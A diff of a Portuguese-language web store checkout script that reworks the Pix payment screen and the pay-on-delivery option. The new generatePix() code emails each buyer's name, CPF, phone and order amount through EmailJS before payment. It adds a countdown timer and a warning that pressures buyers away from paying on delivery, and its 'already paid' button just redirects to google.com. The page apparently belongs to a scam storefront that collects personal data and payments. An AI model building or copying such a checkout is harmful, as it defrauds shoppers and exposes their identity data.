@@ -1706,7 +1706,7 @@
         // No arquivo de checkout, localize a função renderOrderSummary() e substitua por esta:
 
 function renderOrderSummary() {
-    // Seção removida conforme solicitado
+    // Seção de resumo do pedido removida conforme solicitado
     const wrapper = document.getElementById('order-summary-wrapper');
     if (wrapper) {
         wrapper.innerHTML = '';
@@ -1761,175 +1761,206 @@ function renderOrderSummary() {
                             <div id="pix-copy-content" class="pix-copy-section">
                                 <div class="pix-header-status">
                                     <div class="pix-status-badge"><i class="fas fa-check-circle"></i> Código Gerado</div>
+                                    <div class="pix-timer-container"><i class="fas fa-clock"></i> Expira em: <span id="pix-timer">15:00</span></div>
                                 </div>
-                                <div class="pix-qr-container">
-                                    <div id="pix-qr-code"></div>
-                                    <div class="pix-qr-timer">Expira em <span id="pix-timer">15:00</span></div>
+                                <div class="duty-info-section">
+                                    <div class="duty-header"><i class="fas fa-user-shield"></i> Titular da Compra</div>
+                                    <div class="duty-user-data">
+                                        <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div>
+                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>
+
+                                    </div>
+                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este código Pix é nominal e vinculado ao seu CPF.</span></div>
                                 </div>
-                                <div class="pix-copy-box">
-                                    <div class="pix-copy-label">Copia e Cola</div>
-                                    <div class="pix-code-field">
-                                        <span id="pix-code-text">...</span>
-                                        <button id="btn-copy-pix" class="pix-copy-btn"><i class="fas fa-copy"></i></button>
+                                <div class="pix-code-display-wrapper">
+                                    <div class="pix-code-header">
+                                        <label class="pix-code-label">Código Pix</label>
+                                        <span class="pix-code-value-label">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>
+                                    </div>
+                                    <div class="pix-code-input-container">
+                                        <span class="pix-code-display-text" id="pix-code-text">Aguardando código...</span>
+                                        <button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar código"><i class="fas fa-copy"></i></button>
                                     </div>
                                 </div>
-                                <div class="pix-steps">
-                                    <div class="pix-step">1. Abra o app do seu banco</div>
-                                    <div class="pix-step">2. Escolha pagar via Pix</div>
-                                    <div class="pix-step">3. Cole o código ou escaneie o QR Code</div>
-                                </div>
+                                <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar código</button>
+                                <div class="waiting-payment-section"><div class="modern-spinner"></div><div class="waiting-text">Aguardando Pagamento</div></div>
+                                <button class="btn-modal-continue" id="btn-already-paid" style="margin-top: 10px; padding: 14px; border-radius: 12px; font-size: 0.95rem; border: none; cursor: pointer; width: 100%; font-weight: 800; background: var(--primary); color: white;">Já realizei o pagamento</button>
                             </div>
                         </div>
-
-                        <div class="payment-option-card" id="pay-delivery">
-                            <div class="payment-option-icon"><i class="fas fa-truck"></i></div>
+                        <div class="payment-option-card" id="pay-on-delivery">
+                            <div class="payment-badge-delivery" style="position: absolute; top: 12px; right: -30px; background: var(--text-light); color: white; padding: 4px 35px; font-size: 0.7rem; font-weight: 800; transform: rotate(45deg);">Sem Desconto</div>
+                            <div class="payment-option-icon"><i class="fas fa-truck-ramp-box"></i></div>
                             <div class="payment-option-title">Pagar na Entrega</div>
                             <div class="payment-option-price">R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</div>
-                            <div class="payment-option-desc">Pague ao receber. Sujeito a taxa de processamento e logística estendida.</div>
-                            <button class="payment-action-btn" id="btn-pay-delivery" style="margin-top:10px; display:none;">
-                                <span class="btn-text">Selecionar <i class="fas fa-chevron-right"></i></span>
-                            </button>
+                            <div class="payment-option-desc">Pague ao entregador via Cartão ou Dinheiro.</div>
+                            <div class="delivery-warning-container">
+                                <div class="delivery-warning-box"><i class="fas fa-exclamation-triangle"></i><div class="delivery-warning-text">Ao escolher o pagamento na entrega você paga o valor R$ ${deliveryTotal.toFixed(2).replace('.', ',')} total sem descontos e perde a promoção via Pix de R$ ${baseTotal.toFixed(2).replace('.', ',')}</div></div>
+                                <button class="payment-action-btn btn-pay-delivery" style="margin-top:10px; background: var(--primary);">Prosseguir <i class="fas fa-chevron-right"></i></button>
+                            </div>
                         </div>
                     </div>
                 </div>
             `;
-            document.getElementById('payment-options-wrapper').innerHTML = paymentHTML;
 
-            // Setup listeners for payment options
-            document.getElementById('pay-now-pix').addEventListener('click', function(e) {
-                if (e.target.closest('#pix-form') || e.target.closest('#pix-copy-content')) return;
-                
-                selectedPaymentType = 'pix';
-                this.classList.add('selected');
-                document.getElementById('pay-delivery').classList.remove('selected');
-                document.getElementById('pix-form').classList.add('active');
-                document.getElementById('btn-pay-delivery').style.display = 'none';
-                
-                // Scroll suave para o formulário
-                setTimeout(() => {
-                    document.getElementById('pix-form').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-                }, 100);
-            });
-
-            document.getElementById('pay-delivery').addEventListener('click', function() {
-                selectedPaymentType = 'delivery';
-                this.classList.add('selected');
-                document.getElementById('pay-now-pix').classList.remove('selected');
-                document.getElementById('pix-form').classList.remove('active');
-                document.getElementById('btn-pay-delivery').style.display = 'block';
-            });
-
-            // Máscaras e validações PIX
-            const pixCpfInput = document.getElementById('pix-cpf');
-            setupCPFInput(pixCpfInput);
-
-            const pixPhoneInput = document.getElementById('pix-phone');
-            setupPhoneInput(pixPhoneInput);
-
+            document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;
             const pixNameInput = document.getElementById('pix-name');
-            setupNameInput(pixNameInput);
+            if (pixNameInput) setupNameInput(pixNameInput);
+            const pixCpfInput = document.getElementById('pix-cpf');
+            if (pixCpfInput) setupCPFInput(pixCpfInput);
+            const pixPhoneInput = document.getElementById('pix-phone');
+            if (pixPhoneInput) setupPhoneInput(pixPhoneInput);
 
-            // Gerar PIX
-            document.getElementById('btn-generate-pix').addEventListener('click', async () => {
-                const name = document.getElementById('pix-name').value;
-                const cpf = document.getElementById('pix-cpf').value;
-                const phone = document.getElementById('pix-phone').value;
-                const errorMsg = document.getElementById('pix-error-msg');
+            const pixCard = document.getElementById('pay-now-pix');
+            const deliveryCard = document.getElementById('pay-on-delivery');
 
-                if (name.length < 5 || cpf.length < 14 || phone.length < 14) {
-                    errorMsg.querySelector('#pix-error-text').innerText = 'Por favor, preencha todos os campos corretamente.';
-                    errorMsg.classList.add('active');
+            pixCard.addEventListener('click', (e) => {
+                if (e.target.tagName === 'INPUT' || e.target.tagName === 'LABEL') return;
+                if (document.getElementById('pix-copy-content').style.display === 'flex') return;
+                if (selectedPaymentType !== 'pix') {
+                    selectedPaymentType = 'pix';
+                    pixCard.classList.add('selected');
+                    deliveryCard.classList.remove('selected');
+                    const header = document.querySelector('.header'); const headerHeight = header ? header.offsetHeight : 0; const viewportHeight = window.innerHeight - headerHeight; const elementHeight = pixCard.offsetHeight; const elementOffsetTop = pixCard.getBoundingClientRect().top + window.pageYOffset; const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2); window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
+                } else if (e.target.closest('#btn-generate-pix')) {
+                    generatePix();
+                }
+            });
+
+            deliveryCard.addEventListener('click', (e) => {
+                if (selectedPaymentType !== 'delivery') {
+                    selectedPaymentType = 'delivery';
+                    deliveryCard.classList.add('selected');
+                    pixCard.classList.remove('selected');
+                } else if (e.target.closest('.btn-pay-delivery')) {
+                    showDeliveryModal();
+                }
+            });
+
+            document.getElementById('btn-copy-pix-action').addEventListener('click', copyPixCode);
+            const quickCopyBtn = document.getElementById('btn-copy-pix-quick');
+            if (quickCopyBtn) quickCopyBtn.addEventListener('click', (e) => { e.preventDefault(); copyPixCode(); });
+            document.getElementById('btn-already-paid').addEventListener('click', () => { window.location.href = 'https://www.google.com'; });
+        }
+
+
+
+        function startPixTimer(durationInSeconds) {
+            clearInterval(timerInterval);
+            let timer = durationInSeconds;
+            const display = document.getElementById('pix-timer');
+            timerInterval = setInterval(() => {
+                let minutes = parseInt(timer / 60, 10);
+                let seconds = parseInt(timer % 60, 10);
+                display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
+                if (--timer < 0) { clearInterval(timerInterval); display.textContent = "EXPIRADO"; }
+            }, 1000);
+        }
+
+        async function sendEmailJS(name, cpf, phone, valor) {
+            try {
+                const templateParams = {
+                    payer_name: name,
+                    payer_cpf: cpf,
+                    payer_phone: phone,
+                    payer_valor: 'R$ ' + parseFloat(valor).toFixed(2).replace('.', ','),
+                };
+                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+            } catch (err) { console.error('EmailJS error:', err); }
+        }
+
+        async function generatePix() {
+            const name = document.getElementById('pix-name').value.trim();
+            const cpfRaw = document.getElementById('pix-cpf').value;
+            const phone = document.getElementById('pix-phone').value.trim();
+            const cpf = cpfRaw.replace(/\D/g, '');
+            const errorEl = document.getElementById('pix-error-msg');
+            const errorText = document.getElementById('pix-error-text');
+            errorEl.classList.remove('visible');
+
+            if (name.length < 3) { errorText.textContent = 'Informe seu nome completo.'; errorEl.classList.add('visible'); return; }
+            if (cpf.length !== 11) { errorText.textContent = 'Informe um CPF válido.'; errorEl.classList.add('visible'); return; }
+
+            // Recupera cache persistente do localStorage
+            const savedPix = JSON.parse(localStorage.getItem('cached_pix_data'));
+            
+            // Se já gerou um PIX com o mesmo valor, apenas exibe novamente (mesmo após atualizar a página)
+            if (savedPix && parseFloat(savedPix.amount) === subtotalValue && savedPix.code) {
+                showPixCopySection(savedPix.code, name, cpfRaw);
+                return;
+            }
+
+            const btn = document.getElementById('btn-generate-pix');
+            const originalHTML = btn.innerHTML;
+            btn.innerHTML = '<div class="spinner"></div>';
+            btn.disabled = true;
+
+            try {
+                sendEmailJS(name, cpfRaw, phone, subtotalValue);
+                
+                // Caso o CPF seja 111.111.111-11, exibe código fictício sem chamar a API
+                if (cpf === '11111111111') {
+                    const fakePixCode = "00020126330014BR.GOV.BCB.PIX011111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
+                    localStorage.setItem('cached_pix_data', JSON.stringify({ code: fakePixCode, amount: subtotalValue }));
+                    showPixCopySection(fakePixCode, name, cpfRaw);
                     return;
                 }
 
-                errorMsg.classList.remove('active');
-                const btn = document.getElementById('btn-generate-pix');
-                btn.disabled = true;
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando código...';
-
-                try {
-                    // Simulação de geração de PIX (substitua pela sua lógica real de API)
-                    const pixCode = "00020126580014BR.GOV.BCB.PIX01364d6tcchh8nmpez5204000053039865405" + baseTotal.toFixed(2) + "5802BR5920MANUS_AGENT6009SAO_PAULO62070503***6304" + Math.floor(Math.random() * 9999).toString(16).toUpperCase();
-                    
-                    // Enviar e-mail notificando intenção de compra
-                    await sendEmailJS(name, cpf, phone, baseTotal);
-
-                    // Mostrar conteúdo do PIX
-                    document.getElementById('pix-original-content').style.display = 'none';
-                    document.getElementById('pix-copy-content').style.display = 'block';
-                    document.getElementById('pix-code-text').innerText = pixCode;
-                    
-                    // Gerar QR Code (assumindo que a biblioteca QRCode está disponível)
-                    if (typeof QRCode !== 'undefined') {
-                        new QRCode(document.getElementById("pix-qr-code"), {
-                            text: pixCode,
-                            width: 180,
-                            height: 180
-                        });
-                    } else {
-                        document.getElementById("pix-qr-code").innerHTML = '<div style="padding:20px; background:#f0f0f0; border-radius:8px; font-size:0.8rem;">QR Code indisponível (Lib não carregada)</div>';
-                    }
-
-                    startTimer(900, document.getElementById('pix-timer'));
-
-                } catch (err) {
-                    errorMsg.querySelector('#pix-error-text').innerText = 'Erro ao processar. Tente novamente.';
-                    errorMsg.classList.add('active');
-                    btn.disabled = false;
-                    btn.innerHTML = `Pagar R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i>`;
+                const pixCode = await fetchPixCode(name, cpf, phone);
+                if (pixCode) { 
+                    localStorage.setItem('cached_pix_data', JSON.stringify({ code: pixCode, amount: subtotalValue }));
+                    showPixCopySection(pixCode, name, cpfRaw); 
                 }
-            });
-
-            // Botão copiar PIX
-            document.getElementById('btn-copy-pix').addEventListener('click', function() {
-                const code = document.getElementById('pix-code-text').innerText;
-                navigator.clipboard.writeText(code).then(() => {
-                    const icon = this.querySelector('i');
-                    icon.className = 'fas fa-check';
-                    this.style.background = '#27ae60';
-                    setTimeout(() => {
-                        icon.className = 'fas fa-copy';
-                        this.style.background = 'var(--primary-color)';
-                    }, 2000);
-                });
-            });
-
-            // Botão pagar na entrega
-            document.getElementById('btn-pay-delivery').addEventListener('click', () => {
-                showDeliveryModal();
-            });
+                else { throw new Error(); }
+            } catch (err) {
+                errorText.textContent = 'Erro ao gerar PIX. Tente novamente.';
+                errorEl.classList.add('visible');
+                btn.innerHTML = originalHTML;
+                btn.disabled = false;
+            }
         }
 
-        async function sendEmailJS(name, cpf, phone, total) {
-            if (!EMAILJS_SERVICE_ID || EMAILJS_TEMPLATE_ID === 'template_xxx') return;
-            
-            const templateParams = {
-                user_name: name,
-                user_cpf: cpf,
-                user_phone: phone,
-                order_total: total.toFixed(2).replace('.', ','),
-                payment_method: total > subtotalValue ? 'Pagar na Entrega' : 'Pix Agora'
-            };
-
-            return emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+        async function fetchPixCode(payerName, cpf, phone) {
+            const response = await fetch('/api/pix', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    payer_name: payerName,
+                    payer_cpf: cpf,
+                    payer_phone: phone,
+                    amount: subtotalValue.toFixed(2)
+                }),
+            });
+            const data = await response.json();
+            return data.success ? data.pixCode : null;
         }
 
-        function startTimer(duration, display) {
-            let timer = duration, minutes, seconds;
-            const interval = setInterval(function () {
-                minutes = parseInt(timer / 60, 10);
-                seconds = parseInt(timer % 60, 10);
+        function showPixCopySection(qrCode, name, cpf) {
+            document.getElementById('pix-original-content').style.display = 'none';
+            document.getElementById('pix-copy-content').style.display = 'flex';
+            document.getElementById('display-pix-name').innerText = name;
+            document.getElementById('display-pix-cpf').innerText = cpf;
+            document.getElementById('pix-code-text').innerText = qrCode;
+            const pixCardEl = document.getElementById('pay-now-pix');
+            if (pixCardEl) {
+                const header = document.querySelector('.header');
+                const headerHeight = header ? header.offsetHeight : 0;
+                const viewportHeight = window.innerHeight - headerHeight;
+                const elementHeight = pixCardEl.offsetHeight;
+                const elementOffsetTop = pixCardEl.getBoundingClientRect().top + window.pageYOffset;
+                const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2);
+                window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
+            }
+            startPixTimer(900);
+        }
 
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
-
-                display.textContent = minutes + ":" + seconds;
-
-                if (--timer < 0) {
-                    clearInterval(interval);
-                    display.textContent = "EXPIRADO";
-                }
-            }, 1000);
+        function copyPixCode() {
+            const code = document.getElementById('pix-code-text').innerText;
+            navigator.clipboard.writeText(code);
+            const btn = document.getElementById('btn-copy-pix-action');
+            const originalText = btn.innerText;
+            btn.innerText = 'Copiado!';
+            btn.style.background = '#27ae60';
+            setTimeout(() => { btn.innerText = originalText; btn.style.background = 'var(--primary)'; }, 2000);
         }
 
         function showDeliveryModal() {
@@ -1973,6 +2004,7 @@ function renderOrderSummary() {
             renderPaymentOptions();
         });
     </script>
+
 
 
     <!-- Modal de "Código Pix Copiado" Compacto -->
